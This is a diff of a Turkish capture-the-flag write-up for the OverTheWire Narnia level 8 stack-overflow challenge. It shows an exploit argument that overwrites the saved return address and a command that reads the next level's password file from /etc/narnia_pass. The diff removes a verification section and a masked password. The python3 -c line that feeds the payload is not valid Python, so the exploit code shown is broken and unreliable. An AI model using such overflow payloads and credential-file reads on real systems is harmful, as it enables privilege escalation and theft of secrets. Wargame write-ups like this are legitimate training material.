@@ -80,11 +80,9 @@ ARG1 = b"A"*20 + pack(B0) + b"BBBB" + pack(EGG_addr+10000)
 # env silinmiyor -> cat çalışır; timed feed
 python3 -c 'timed: "id; cat /etc/narnia_pass/narnia9"' | /narnia/narnia8 "$ARG1"
 ```
-Çıktı: `uid=14009(narnia9)` → şifre. (Deneme-yanılma OLMADAN ilk seferde.)
+Çıktı: `uid=14009(narnia9)` → şifre. 
 
-## 8. Doğrulama
-`ssh narnia9@... -p 2226` → `uid=14009(narnia9)` ✅
-`/narnia/` altında narnia9 binary'si YOK → **narnia9 son seviye, Narnia tamamlandı.**
+
 
 ## Dersler
 | Konu | Not |
@@ -95,4 +93,3 @@ python3 -c 'timed: "id; cat /etc/narnia_pass/narnia9"' | /narnia/narnia8 "$ARG1"
 | null-free | argv string null içeremez (B0/ADDR baytlarını kontrol et) |
 | indeks tablosu | `bok[i]→ebp+i-0x18`: 20-23 blah, 24-27 s.ebp, **28-31 saved eip** |
 
-**narnia9 şifresi: `**********`** — 🎉 **Narnia 0→9 tamamlandı.**
